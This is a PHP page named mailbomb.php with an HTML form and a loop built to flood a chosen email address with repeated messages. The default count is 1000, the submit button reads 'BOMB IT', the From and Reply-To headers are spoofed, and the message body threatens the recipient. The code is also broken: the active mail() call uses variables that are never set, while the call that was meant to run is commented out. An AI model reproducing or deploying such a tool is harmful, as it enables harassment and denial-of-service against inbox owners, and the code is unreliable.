<?php
	include("sql_connect.inc");
	//echo("count = $count<BR>");
	if(@$_POST["todo"] == "send"){
		$Email = @$_POST["address"];
		$number = @$_POST["number"];
		$topic = @$_POST["topic"];
		$message = @$_POST["message"];
		$name_array = array();
		$domain_array = array();
		$ext_array = array("gov", "net", "us", "com", "edu");
		
		$domains = mysql_query("SELECT * FROM domain");
		while($temp = mysql_fetch_array($domains)){
			$domain_array[$temp[0]] = $temp[1];
		}
		$num_domains = sizeof($domain_array);
		
		$names = mysql_query("SELECT * FROM names");
		while($temp = mysql_fetch_array($names)){
			$name_array[$temp[0]] = $temp[1];
		}
		$num_names = sizeof($name_array);
		
		$headers  = "MIME-Version: 1.0\r\n";
		$headers .= "Content-type: text/html; charset=iso-8859-1\r\n";
		$headers .= "From: go@to.hell\r\nReply-To: revenge@is.sweet\r\nX-Mailer: PHP/" . phpversion() . "\r\n";
		
		$body="<h1>Fuk off or you will get another bomb.</h1>\n\n";
		$body .="<h2>$message</h2>";
		
		/* To send HTML mail, you can set the Content-type header. */
		for($i=0;$i<$number;$i++){
			$domain = rand(1,($num_domains-1));
			$domain = $domain_array[$domain];
			$first_name = rand(1, ($num_names/2 - 1));
			$last_name = rand(($num_names/2), ($num_names-1));
			$first_name = $name_array[$first_name];
			$last_name = $name_array[$last_name];
			mail("$recipient", "$subject", $message,
     			"From: $sender\r\nReply-To: $sender\r\n" .
        	    "Content-Type: text/html; charset=iso-8859-1\r\n" .
        	    "X-Mailer: PHP/" . phpversion());
			//mail("$Email", "$topic", "$body" , "$headers");
		}
		echo("<H2>$Email has been sent $number emails.</H2>");
		echo("<A HREF=./mailbomb.php>BACK</A>");
	}
	else{
	?>
<HTML>
<TITLE>
	Enter your information.
</TITLE>
<BODY>
<H1 ALIGN="CENTER">Enter your info then submit.</H1>
<TABLE>
	<FORM ACTION="mailbomb.php" METHOD="POST">
		<INPUT TYPE="HIDDEN" NAME="todo" VALUE="send">
		<TR>
			<TD>Email Address:</TD>
			<TD><INPUT TYPE="TEXT" NAME="address"></TD>
		</TR>
		<TR>
			<TD>Number of Emails:</TD>
			<TD><INPUT TYPE="TEXT" NAME="number" VALUE="1000"></TD>
		</TR>
		<TR>
			<TD>Topic:</TD>
			<TD><INPUT TYPE="TEXT" NAME="topic" VALUE="I Hate SPAM and POP-UPS" SIZE="100"></TD>
		</TR>
		<TR>
			<TD>Body:</TD>
			<TD>
				<TEXTAREA NAME="message" COLS="80" ROWS="5">I get another message and you get another bomb!!!</TEXTAREA>
			</TD>
		</TR>
		
		<TR>
			<TD COLSPAN = 2>
				<INPUT TYPE="SUBMIT" VALUE="BOMB IT">
			</TD>
		</TR>		
	</FORM>
</TABLE>	
</BODY>
</HTML>
	<?php
	}
?>
